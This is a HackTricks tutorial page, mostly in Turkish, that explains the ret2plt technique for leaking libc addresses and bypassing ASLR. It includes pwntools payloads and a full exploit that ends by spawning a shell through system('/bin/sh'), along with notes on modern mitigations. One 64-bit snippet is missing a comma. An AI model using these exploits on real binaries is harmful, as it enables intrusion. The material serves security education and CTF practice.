# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## Temel Bilgiler

Bu tekniğin amacı, ASLR'ı bypass edebilmek için **PLT'den bir fonksiyonun adresini leak etmektir**. Bu nedenle, örneğin `libc`'den `puts` fonksiyonunun adresini leak ederseniz, daha sonra **`libc`'nin tabanının nerede olduğunu hesaplayabilir** ve **`system`** gibi diğer fonksiyonlara erişmek için offsetleri hesaplayabilirsiniz.

Bu, `pwntools` payload'u gibi bir payload ile yapılabilir ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Note how **`puts`** (using the address from the PLT) is called with the address of `puts` located in the GOT (Global Offset Table). This is because by the time `puts` prints the GOT entry of puts, this **entry will contain the exact address of `puts` in memory**.

Ayrıca exploit'te `main` adresinin kullanıldığına dikkat edin; böylece `puts` yürütmesini bitirdiğinde, **binary çıkmak yerine tekrar `main`'i çağırır** (dolayısıyla leak edilmiş adres geçerli kalmaya devam eder).

> [!CAUTION]
> Dikkat edin: bunun çalışması için **binary PIE ile derlenmemiş olmalıdır** veya PLT, GOT ve main adreslerini bilmek için **PIE'yi atlatmak amacıyla bir leak bulmuş olmalısınız**. Aksi takdirde önce PIE'yi atlatmanız gerekir.

You can find a [**full example of this bypass here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). This was the final exploit from that **example**:

<details>
<summary>Full exploit example (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## Modern dikkate alınacaklar

- **`-fno-plt` builds** (modern dağıtımlarda yaygın) `call foo@plt`'yi `call [foo@got]` ile değiştirir. Eğer ikili dosyada `foo@plt` stub'u yoksa, yine de çözülmüş adresi `puts(elf.got['foo'])` ile leak edebilirsiniz ve sonra **doğrudan GOT girişine dönün** (`flat(padding, elf.got['foo'])`) böylece lazy binding tamamlandıktan sonra libc'ye atlayabilirsiniz.
- **Full RELRO / `-Wl,-z,now`**: GOT salt okunurdur ama ret2plt yine de leak için işe yarar çünkü sadece GOT slotunu okursunuz. Eğer sembol hiç çağrılmadıysa, ilk ret2plt'iniz aynı zamanda lazy binding yapacak ve ardından çözülmüş slotu yazdıracaktır.
- **ASLR + PIE**: Eğer PIE etkinse, önce PIE tabanını hesaplamak için bir kod işaretçisi leak edin (ör. kaydedilmiş dönüş adresi, fonksiyon işaretçisi veya başka bir format‑string/infoleak ile `.plt` girdisi), sonra PLT/GOT adresleri yeniden tabanlandırılmış olarak ret2plt zincirini oluşturun.
- **Non‑x86 architectures with BTI/PAC (AArch64)**: PLT girişleri geçerli BTI landing pad'leridir (`bti c`), bu yüzden BTI‑etkin ikililerde exploit yaparken doğrudan BTI'siz bir libc gadget'ına atlamak yerine PLT stub'una (veya başka bir BTI‑annotated gadget'a) atlamayı tercih edin; aksi takdirde CPU `BRK`/`PAC` hataları verecektir.
- **Hızlı çözüm yardımcısı**: hedef fonksiyon henüz çözülmemişse ve tek seferde bir leak'e ihtiyacınız varsa, PLT çağrısını iki kez zincirleyin: önce `elf.plt['foo']` (çözmek için) sonra tekrar `elf.plt['foo']` GOT adresini argüman olarak vererek şimdi dolmuş slotu yazdırmak için.

## Diğer örnekler & References

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR etkin ama PIE yok. İlk adım overflow'u canary'nin 0x00 baytına kadar doldurmak, sonra puts'u çağırıp onu leak etmektir. Canary ile puts'un GOT'taki adresini leak etmek için bir ROP gadget oluşturulur ve ardından `system('/bin/sh')`'i çağırmak için başka bir ROP gadget kullanılır.
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bit, ASLR etkin, canary yok, child bir fonksiyondan main içinde stack overflow oluşuyor. puts'un GOT'taki adresini leak etmek için bir ROP gadget kullanılıyor ve ardından bir one gadget çağrılıyor.

## Referanslar

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
